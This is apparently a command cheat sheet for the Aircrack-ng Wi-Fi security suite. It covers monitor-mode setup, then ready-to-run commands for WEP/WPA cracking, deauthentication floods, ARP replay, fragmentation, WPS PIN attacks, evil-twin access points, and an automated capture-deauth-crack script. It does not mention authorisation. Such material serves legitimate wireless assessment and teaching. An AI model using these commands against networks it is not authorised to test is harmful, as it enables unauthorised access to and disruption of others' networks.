What is Aircrack-ng?

Aircrack-ng is a complete suite of tools to assess Wi-Fi network security. It focuses on different areas of Wi-Fi security: monitoring (packet capture and export of data to text files for further processing by third party tools), attacking (replay attacks, deauthentication, fake access points and others via packet injection), testing (checking Wi-Fi cards and driver capabilities), and cracking (WEP and WPA PSK (WPA 1 and 2)).

Installation & Setup

Linux Installation

# Ubuntu/Debian
sudo apt update && sudo apt install aircrack-ng

# Kali Linux (pre-installed)
aircrack-ng --help

# From source
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
make
sudo make install

Hardware Requirements

  • Compatible Wi-Fi adapter: Must support monitor mode and packet injection
  • Recommended chipsets: Atheros, Ralink, Realtek (check compatibility)
  • External USB adapters: Often better than built-in cards

Setting Up Monitor Mode

Enable Monitor Mode

# Check wireless interfaces
iwconfig

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify monitor mode (should show wlan0mon)
iwconfig

Disable Monitor Mode

# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restart network services
sudo systemctl restart NetworkManager

Wireless Reconnaissance

Discover Access Points

# Scan for all access points
sudo airodump-ng wlan0mon

# Scan specific channel
sudo airodump-ng -c 6 wlan0mon

# Scan specific frequency band
sudo airodump-ng --band a wlan0mon  # 5GHz
sudo airodump-ng --band bg wlan0mon # 2.4GHz

Target Specific Network

# Monitor specific BSSID and save to file
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Show only clients (stations)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF --showack wlan0mon

WEP Cracking

Capture WEP Traffic

# Start capturing on specific channel/BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# In another terminal, generate traffic (ARP replay)
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 wlan0mon

Crack WEP Key

# Crack with captured IVs (need ~20,000+ IVs)
aircrack-ng wep_capture-01.cap

# Crack with specific key length
aircrack-ng -n 64 wep_capture-01.cap  # 64-bit key
aircrack-ng -n 128 wep_capture-01.cap # 128-bit key

WPA/WPA2 Cracking

Capture WPA Handshake

# Start capturing
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon

# In another terminal, deauthenticate client to force handshake
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon

# Wait for "WPA handshake" message in airodump-ng

Crack WPA/WPA2 PSK

# Dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap

# With specific ESSID
aircrack-ng -w wordlist.txt -e "NetworkName" wpa_capture-01.cap

# Show handshake info
aircrack-ng wpa_capture-01.cap

Packet Injection Attacks

Deauthentication Attack

# Deauth all clients from AP
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth specific client
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon

# Continuous deauth (use Ctrl+C to stop)
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

ARP Replay Attack

# ARP replay to generate traffic
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 wlan0mon

# Fake authentication first (for WEP)
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 wlan0mon

Fragmentation Attack

# Fragmentation attack to obtain keystream
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 wlan0mon

# Use obtained keystream for packet forging
sudo packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 -k 255.255.255.255 -l 255.255.255.255 -y fragment-*.xor -w arp-request

Advanced Techniques

WPS PIN Attack

# Check for WPS-enabled APs
sudo wash -i wlan0mon

# Attack WPS PIN (use with reaver)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Pixie dust attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K

Evil Twin Attack Setup

# Create fake AP
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# With specific BSSID
sudo airbase-ng -a AA:BB:CC:DD:EE:FF -e "FreeWiFi" -c 6 wlan0mon

# WPA2 fake AP
sudo airbase-ng -e "SecureWiFi" -c 6 -z 2 -W 1 wlan0mon

Automation Scripts

Automated WPA Cracking Script

#!/bin/bash
# Simple WPA cracking automation

INTERFACE="wlan0mon"
BSSID="$1"
CHANNEL="$2"
WORDLIST="/usr/share/wordlists/rockyou.txt"

if [ $# -ne 2 ]; then
    echo "Usage: $0  "
    exit 1
fi

echo "[+] Starting capture on $BSSID (Channel $CHANNEL)"
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w capture $INTERFACE &
DUMP_PID=$!

sleep 10

echo "[+] Sending deauth packets"
sudo aireplay-ng -0 5 -a $BSSID $INTERFACE

sleep 5
kill $DUMP_PID

echo "[+] Starting dictionary attack"
aircrack-ng -w $WORDLIST capture-01.cap

Troubleshooting

Common Issues

  • No injection: Check if adapter supports packet injection with aireplay-ng -9 wlan0mon
  • Monitor mode fails: Kill interfering processes with airmon-ng check kill
  • No handshake captured: Ensure clients are connected and try multiple deauth attempts
  • Slow IV collection: Use ARP replay attack to generate traffic

Testing Injection

# Test injection capability
sudo aireplay-ng -9 wlan0mon

# Test against specific AP
sudo aireplay-ng -9 -e "NetworkName" -a AA:BB:CC:DD:EE:FF wlan0mon

Pro Tips & Best Practices

  • Use external USB adapters: Often more reliable than built-in cards
  • Check compatibility first: Not all Wi-Fi adapters support monitor mode
  • Be patient with handshakes: May take multiple deauth attempts
  • Use good wordlists: rockyou.txt is a good start, but custom lists work better
  • Monitor multiple channels: Use channel hopping for better coverage
  • Save everything: Always use -w flag to save captures
  • Clean your captures: Use wpaclean to remove unnecessary packets
  • Combine with other tools: Use with Hashcat for faster WPA cracking
